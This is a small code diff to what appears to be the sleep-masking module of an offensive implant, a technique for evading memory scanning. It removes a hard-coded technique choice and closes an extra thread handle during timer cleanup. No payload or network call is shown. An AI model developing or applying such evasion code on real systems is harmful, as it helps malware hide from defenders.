@@ -23,8 +23,6 @@ auto DECLFN Mask::Main(
 
     KhDbg( "sleep during: %d ms", RndTime );
 
-    this->Ctx.TechniqueID = MaskWait;
-
     switch( this->Ctx.TechniqueID ) {
     case MaskTimer:
         Success = this->Timer( RndTime ); break;
@@ -183,12 +181,13 @@ auto DECLFN Mask::Timer(
     }
 
 _KH_END:
-    if ( DupThreadHandle ) Self->Ntdll.NtClose( DupThreadHandle );
-    if ( Timer           ) Self->Ntdll.RtlDeleteTimer( Queue, Timer, EventTimer );
-    if ( Queue           ) Self->Ntdll.RtlDeleteTimerQueue( Queue );
-    if ( EventEnd        ) Self->Ntdll.NtClose( EventEnd  );
-    if ( EventStart      ) Self->Ntdll.NtClose( EventStart );
-    if ( EventTimer      ) Self->Ntdll.NtClose( EventTimer  );
+    if ( DupThreadHandle  ) Self->Ntdll.NtClose( DupThreadHandle );
+    if ( MainThreadHandle ) Self->Ntdll.NtClose( MainThreadHandle );
+    if ( Timer            ) Self->Ntdll.RtlDeleteTimer( Queue, Timer, EventTimer );
+    if ( Queue            ) Self->Ntdll.RtlDeleteTimerQueue( Queue );
+    if ( EventEnd         ) Self->Ntdll.NtClose( EventEnd  );
+    if ( EventStart       ) Self->Ntdll.NtClose( EventStart );
+    if ( EventTimer       ) Self->Ntdll.NtClose( EventTimer  );
 
     if ( NtStatus == STATUS_SUCCESS ) { return TRUE; } 
     else { return FALSE; }
